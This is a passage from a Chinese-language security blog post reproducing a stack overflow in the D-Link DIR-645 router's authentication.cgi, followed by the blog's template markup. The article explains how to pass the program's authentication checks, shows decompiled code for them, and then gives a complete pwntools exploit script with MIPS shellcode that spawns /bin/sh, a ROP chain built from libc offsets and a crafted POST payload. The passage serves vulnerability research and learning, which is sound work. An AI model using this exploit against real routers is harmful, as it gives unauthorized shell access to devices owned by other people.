+<p>其中sobj_xstream_eatwhite()如下，通过pwngdb动态调试，可知xs_getc()是读取文件中的数据，当遇到‘ ’、‘\t’、‘\n’、‘\r’时跳出，并且我们可以看到有该函数调用了3次，同时，看上面的代码发现strcmp()的参数v34和string，string是文件中的内容，v34是我们输入的id，因此创建<code>/var/passwd</code>文件并在文件中输入‘1234 5678 90’即可绕过第二次检查</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/80c6a3e7d97ce.png" alt="image-20230430104703571"></p>
+<p>我们再来看一下第三次检查，首先第一个sprintf函数的后两个参数一个是v67即我们的输入id，最后一个参数&amp;v58[16]是第一次检查中存储的cookie的第0x40位的地址，因此，将id和cookie的第0x40后的数据拼接在一起后对其进行md5，将得到的md5值与我们输入的密码进行比较。<strong>因此，可知密码即为md5(id+cookie[0x40])。但该md5似乎不是常规的md5，如果可以知道该该算法具体细节，即可以很轻松的获取密码</strong></p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/921a8f671c485.png" alt="image-20230430105254362"></p>
+<p>现在进行最后一次检查，进入check_id函数</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/96f3c02b4abef.png" alt="image-20230430110033072"></p>
+<p>check_id函数代码如下,打开了<code>/var/run/storage_account_root</code>文件，文件内容格式需为<code>id:passwd</code>,但该函数仅进行了一次<code>strncasecmp()</code>比较，仅比较了id，没有对passwd进行检查。创建该文件，向文件中写入‘1234：任意’，即可绕过最后一次检查。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_40AC6C(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v4; // $s2</span><br><span class="line">  const char *v5; // $s0</span><br><span class="line">  char *v6; // $v0</span><br><span class="line">  int v7; // $s1</span><br><span class="line">  const char *id; // $s0</span><br><span class="line">  size_t v9; // $s1</span><br><span class="line">  bool v10; // dc</span><br><span class="line">  size_t v11; // $v0</span><br><span class="line">  char *passwd; // $s0</span><br><span class="line">  signed int v13; // $a3</span><br><span class="line">  int v14; // $a0</span><br><span class="line">  signed int i; // $v1</span><br><span class="line">  int v16; // $v0</span><br><span class="line">  _BYTE *v17; // $a1</span><br><span class="line">  int v18; // $v0</span><br><span class="line">  char *v19; // $a2</span><br><span class="line">  int v20; // $s0</span><br><span class="line">  void *ptr; // [sp+18h] [-108h] BYREF</span><br><span class="line">  int v23; // [sp+1Ch] [-104h] BYREF</span><br><span class="line">  char v24[256]; // [sp+20h] [-100h] BYREF</span><br><span class="line"></span><br><span class="line">  ptr = 0;</span><br><span class="line">  v23 = 0;</span><br><span class="line">  v4 = fopen(&quot;/var/run/storage_account_root&quot;, &quot;r&quot;);</span><br><span class="line">  if ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( getline(&amp;ptr, &amp;v23, v4) != -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (const char *)ptr;</span><br><span class="line">      v6 = strchr((const char *)ptr, &#x27;:&#x27;);</span><br><span class="line">      v7 = v6 - v5;</span><br><span class="line">      if ( !v6 )</span><br><span class="line">        break;</span><br><span class="line">      strncpy(v24, v5, v6 - v5);</span><br><span class="line">      id = *(const char **)(a1 + 4);            // id:password</span><br><span class="line">      v24[v7] = 0;</span><br><span class="line">      v9 = strlen(id);</span><br><span class="line">      v10 = strncasecmp(v24, id, v9) != 0;      // 大小写忽略比较账号</span><br><span class="line">      v11 = v9 + 1;</span><br><span class="line">      if ( !v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        passwd = (char *)ptr + v11;</span><br><span class="line">        v13 = strlen((const char *)ptr + v11);</span><br><span class="line">        v14 = 0;</span><br><span class="line">        for ( i = 0; ; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          v19 = &amp;passwd[i];</span><br><span class="line">          if ( i &gt;= v13 )</span><br><span class="line">            break;</span><br><span class="line">          v16 = *v19;</span><br><span class="line">          v17 = (_BYTE *)(a2 + v14);</span><br><span class="line">          if ( v16 == &#x27;\\&#x27; )                    // if password include &#x27;\&#x27;,后面不是‘，’、‘\’，跳过这个‘\’</span><br><span class="line">          &#123;</span><br><span class="line">            v18 = v19[1];</span><br><span class="line">            if ( v18 == &#x27;,&#x27; || v18 == &#x27;\\&#x27; )</span><br><span class="line">            &#123;</span><br><span class="line">              *v17 = v18;</span><br><span class="line">              ++v14;</span><br><span class="line">              ++i;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            ++v14;</span><br><span class="line">            if ( v16 == &#x27;,&#x27; )                   // if &#x27;,&#x27;,break</span><br><span class="line">            &#123;</span><br><span class="line">              *v17 = 0;</span><br><span class="line">              break;</span><br><span class="line">            &#125;</span><br><span class="line">            *v17 = v16;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        strcpy((char *)(a1 + 12), v24);</span><br><span class="line">        v20 = 0;</span><br><span class="line">        goto LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v20 = -1;</span><br><span class="line">LABEL_18:</span><br><span class="line">  if ( ptr )</span><br><span class="line">    free(ptr);</span><br><span class="line">  return v20;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在所有检查都通过我们创建文件进行了绕过，在真实环境中，我们只需要获取账号即id以及cookie值（<del>不知道bp抓包可不可以，可惜没有真机，要是有一定试试</del>），就可以利用该溢出漏洞。</p>
+<p>现在我们来构造我们的payload，我们只需要利用read()，<strong>由于read()不会被\x00截断，因此可以利用这一点来构造我们的payload</strong>，剩下的就比较简单了，和上一篇的payload相似，直接给出完整exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;mips&#x27;</span><br><span class="line">libc=ELF(&#x27;./lib/libc.so.0&#x27;)</span><br><span class="line"></span><br><span class="line">libc_base=0x3ff38000</span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    slti $a2, $zero, -1</span><br><span class="line">    li $t7, 0x69622f2f</span><br><span class="line">    sw $t7, -12($sp)</span><br><span class="line">    li $t6, 0x68732f6e</span><br><span class="line">    sw $t6, -8($sp)</span><br><span class="line">    sw $zero, -4($sp)</span><br><span class="line">    la $a0, -12($sp)</span><br><span class="line">    slti $a1, $zero, -1</span><br><span class="line">    li $v0, 4011</span><br><span class="line">    syscall 0x40404</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;id=1234&amp;password=4B029816680A9C33518C58E91D476787&#x27;+b&#x27;\x00&#x27;+b&#x27;c&#x27;*(128-32)</span><br><span class="line">payload+=b&#x27;a&#x27;*132+b&#x27;\x00&#x27;+b&#x27;a&#x27;*(789-0x18)</span><br><span class="line">#b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj&#x27;</span><br><span class="line">payload+=p32(libc_base+0x159d8)*4+b&#x27;aaaa&#x27;+p32(libc_base+0x42120)+p32(libc_base+0x47d5c)</span><br><span class="line">payload.ljust(0x437,b&#x27;a&#x27;)</span><br><span class="line">payload+=b&#x27;a&#x27;*0x20+shellcode</span><br><span class="line">len1=len(payload)</span><br><span class="line"></span><br><span class="line">io=process(argv=[&#x27;./qemu&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;-E&#x27;,&#x27;CONTENT_LENGTH=1379&#x27;,&#x27;-E&#x27;,&#x27;CONTENT_TYPE=application/x-www-form-urlencodede&#x27;,&#x27;-E&#x27;,&#x27;SCRIPT_NAME=common&#x27;,&#x27;-E&#x27;,&#x27;REQUEST_METHOD=POST&#x27;,&#x27;-E&#x27;, &#x27;HTTP_COOKIE=uid=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;,&#x27;-E&#x27;, &#x27;REQUEST_URI=/authentication.cgi&#x27;,&#x27;-E&#x27;,&#x27;REMOTE_ADDR=192.168.1.1&#x27;,&#x27;/htdocs/web/authentication.cgi&#x27;])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>ABf1ag</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2023/04/28/d-link-dir-645-yi-chu-lou-dong-fu-xian/" target="_blank" title="D-Link-DIR-645溢出漏洞复现">http://abf1ag.github.io/2023/04/28/d-link-dir-645-yi-chu-lou-dong-fu-xian/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload" src="/medias/11.jpg" alt="">
+    </div>
+    <a href="/2099/06/11/ri-zhi/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> 上一篇:
+        <div class="title-text">日志</div>
+      </div>
+      
+      <!-- <div class="content">
+        
+  095b7e92f0aa22f6bd640c7b7674aef9f3ae98839ba9085cfd09349a9
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload" src="/medias/5.jpg" src="" alt="">
+    </div>
+    <a href="/2023/04/13/d-link-dir-815-zhan-yi-chu-lou-dong-fu-xian/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">D-Link-DIR-815栈溢出漏洞复现</div>
+      </div>
+      <!-- <div class="content">
+        D-Link-DIR-815栈溢出漏洞复现
+
+环境搭建binwalk安装
+ 1234567891011121314151
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  
+<aside id='l_side'>
+  
+    
+      
+        <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img src='https://s1.ax1x.com/2023/02/06/pScRfqH.jpg'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>ABf1ag</h2>
+        
+        
+          <p>永远学不明白的胖儿</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">ABf1ag's blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/yuang01/hexo-theme-bamboo"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=2685356508"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+      
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#D-Link-DIR-645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">D-Link-DIR-645溢出漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E6%8F%90%E5%8F%96"><span class="toc-text">固件下载及提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2099/06/11/ri-zhi/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">06-11</span>
+                
+              </div>
+              <a class="post-title" href="/2099/06/11/ri-zhi/">日志</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/04/28/d-link-dir-645-yi-chu-lou-dong-fu-xian/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/8.jpg" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-28</span>
+                
+              </div>
+              <a class="post-title" href="/2023/04/28/d-link-dir-645-yi-chu-lou-dong-fu-xian/">D-Link-DIR-645溢出漏洞复现</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/04/13/d-link-dir-815-zhan-yi-chu-lou-dong-fu-xian/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/5.jpg" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-13</span>
+                
+              </div>
+              <a class="post-title" href="/2023/04/13/d-link-dir-815-zhan-yi-chu-lou-dong-fu-xian/">D-Link-DIR-815栈溢出漏洞复现</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/01/18/kernel-chu-tan/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">01-18</span>
+                
+              </div>
+              <a class="post-title" href="/2023/01/18/kernel-chu-tan/">kernel初探</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/01/06/llvmpass-chu-tan/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">01-06</span>
+                
+              </div>
+              <a class="post-title" href="/2023/01/06/llvmpass-chu-tan/">llvmpass初探</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || '#42b983';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
